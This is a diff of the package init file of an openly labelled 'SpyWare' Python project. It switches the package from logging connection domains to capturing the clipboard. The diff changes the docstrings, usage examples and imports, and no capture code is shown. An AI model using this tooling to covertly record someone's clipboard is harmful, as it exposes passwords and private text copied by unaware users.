@@ -2,7 +2,7 @@
 # -*- coding: utf-8 -*-
 
 ###################
-#    This file implements a SpyWare for connection destinations.
+#    This package implements a SpyWare to capture the clipboard.
 #    Copyright (C) 2021, 2022  Maurice Lambert
 
 #    This program is free software: you can redistribute it and/or modify
@@ -20,16 +20,16 @@
 ###################
 
 """
-This file implements a SpyWare for connection destinations.
+This package implements a SpyWare to capture the clipboard.
 
-~# python3 DomainsLogger.py domainsSpy.conf
+~# python3 ClipboardLogger.py clipboardSpy.conf
 
 >>> from os import environ
->>> environ['domainsSpy.conf'] = 'domainsSpy.conf'
->>> from SpyWare.DomainsLogger import domainsSpy
->>> domainsSpy()                  # (using env) OR
->>> domainsSpy('domainsSpy.conf') # (using config file name) OR
->>> domainsSpy(argv=["DomainsLogger.py", "domainsSpy.conf"]) # (using argv)
+>>> environ['clipboardSpy.conf'] = 'clipboardSpy.conf'
+>>> from SpyWare.ClipboardLogger import clipboardSpy
+>>> clipboardSpy()                    # (using env) OR
+>>> clipboardSpy('clipboardSpy.conf') # (using config file name) OR
+>>> clipboardSpy(argv=["ClipboardLogger.py", "clipboardSpy.conf"]) # (using argv)
 """
 
 __version__ = "1.0.0"
@@ -38,7 +38,7 @@ __author_email__ = "mauricelambert434@gmail.com"
 __maintainer__ = "Maurice Lambert"
 __maintainer_email__ = "mauricelambert434@gmail.com"
 __description__ = """
-This file implements a complete spyware.
+This package implements a SpyWare to capture the clipboard.
 """
 license = "GPL-3.0 License"
 __url__ = "https://github.com/mauricelambert/SpyWare"
@@ -52,21 +52,17 @@ under certain conditions.
 __license__ = license
 __copyright__ = copyright
 
-__all__ = ["DomainsLogger", "domainsSpy", "domainsConfig"]
+__all__ = ["Daemon", "clipboardSpy", "clipboardConfig"]
 
 try:
-    from .DomainsLogger import (
+    from .ClipboardLogger import (
         Daemon,
-        CacheAppData,
-        CacheDNS,
-        main as domainsSpy,
-        config_load as domainsConfig,
+        main as clipboardSpy,
+        config_load as clipboardConfig,
     )
 except ImportError:
-    from DomainsLogger import (
+    from ClipboardLogger import (
         Daemon,
-        CacheAppData,
-        CacheDNS,
-        main as domainsSpy,
-        config_load as domainsConfig,
+        main as clipboardSpy,
+        config_load as clipboardConfig,
     )
